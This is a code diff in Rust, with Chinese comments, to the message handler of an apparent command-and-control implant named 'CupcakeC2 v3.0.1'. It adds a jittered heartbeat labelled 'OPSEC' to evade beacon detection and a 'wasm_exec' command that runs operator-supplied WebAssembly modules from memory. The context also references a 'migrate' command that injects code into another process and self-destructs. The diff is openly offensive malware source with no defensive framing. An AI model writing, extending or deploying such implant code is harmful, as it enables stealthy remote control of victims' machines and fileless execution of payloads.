@@ -62,24 +62,44 @@ impl MessageHandler {
             return Err(e);
         }
         
+        let mut interval_secs = crate::config::get_heartbeat_interval();
+        if interval_secs == 0 { interval_secs = 10; } // 默认 10s
+
         loop {
-            // 从传输层接收消息
-            match self.transport.receive().await {
-                Ok(data) => {
-                    // 检查是否为空数据（连接关闭）
-                    if data.is_empty() {
-                        return Ok(self.transport);
-                    }
-                    
-                    // 处理接收到的消息
-                    if let Err(_) = self.handle_message(&data).await {
-                        // 继续循环，不因为单个消息处理失败而断开连接
-                        continue;
+            // ⚡ OPSEC: 计算随机抖动 (Jitter)
+            // 在基础间隔上增加 ±30% 的随机变动
+            use rand::Rng;
+            let jitter = rand::thread_rng().gen_range(0..=(interval_secs / 3));
+            let final_delay = if rand::thread_rng().gen_bool(0.5) {
+                interval_secs + jitter
+            } else {
+                interval_secs.saturating_sub(jitter).max(5)
+            };
+
+            tokio::select! {
+                // 1. 监听来自传输层的数据
+                data_res = self.transport.receive() => {
+                    match data_res {
+                        Ok(data) => {
+                            if data.is_empty() { return Ok(self.transport); }
+                            if let Err(_) = self.handle_message(&data).await {
+                                continue;
+                            }
+                        }
+                        Err(_) => return Ok(self.transport),
                     }
                 }
-                Err(_) => {
-                    // 传输层错误，返回以便重连
-                    return Ok(self.transport);
+                // 2. 抖动心跳定时器
+                _ = tokio::time::sleep(tokio::time::Duration::from_secs(final_delay)) => {
+                    // 发送静默心跳包
+                    let hb_msg = CommandResult {
+                        stdout: String::new(),
+                        stderr: String::new(),
+                        path: None,
+                        req_id: Some("heartbeat".to_string()),
+                    };
+                    let _ = self.send_message(&hb_msg.to_response_message()).await;
+                    debug!("Jitter Heartbeat sent (Interval: {}s)", final_delay);
                 }
             }
         }
@@ -534,7 +554,29 @@ impl MessageHandler {
                     }
                 }
             }
+            "wasm_exec" => {
+                // 🚨 WASM SKILL EXECUTION: Run Wasm module from memory - CupcakeC2 v3.0.1
+                let wasm_b64 = command_payload.data.as_deref().unwrap_or("");
+                match base64::engine::general_purpose::STANDARD.decode(wasm_b64.trim()) {
+                    Ok(wasm_bytes) => {
+                        let args: serde_json::Value = match serde_json::from_str(&command_payload.command_content) {
+                            Ok(v) => v,
+                            Err(_) => serde_json::json!({}),
+                        };
+                        let mut res = crate::wasm_host::execute_wasm_skill(&wasm_bytes, args).await;
+                        res.req_id = command_payload.req_id.clone();
+                        res
+                    }
+                    Err(e) => CommandResult {
+                        stdout: String::new(),
+                        stderr: format!("Failed to decode Wasm data: {}", e),
+                        path: None,
+                        req_id: None,
+                    },
+                }
+            }
             "migrate" => {
+
                 // 🚀 ONE-CLICK MIGRATION: Inject the backup .bin into memory and self-destruct
                 
                 // 1. Resolve PID
